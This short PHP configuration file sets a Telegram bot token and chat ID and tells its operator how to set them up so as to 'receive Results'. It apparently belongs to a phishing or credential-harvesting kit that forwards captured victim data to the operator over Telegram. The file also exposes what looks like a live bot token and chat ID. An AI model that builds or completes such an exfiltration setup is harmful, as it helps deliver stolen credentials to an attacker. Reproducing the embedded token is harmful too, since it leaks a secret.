<?php
// Please Read ResultsConfig.php Before doing anything

$Token = '8587481198:AAGcMw91hPAL3p2ssgIyRUDiY-fRDExatLM'; // Your telegram bot token make it via BotFather after you done making it Send /start to it else you cant receive Results 
$ChatID = '5000006602'; // Your Chat ID get it from @username_to_id_bot
?>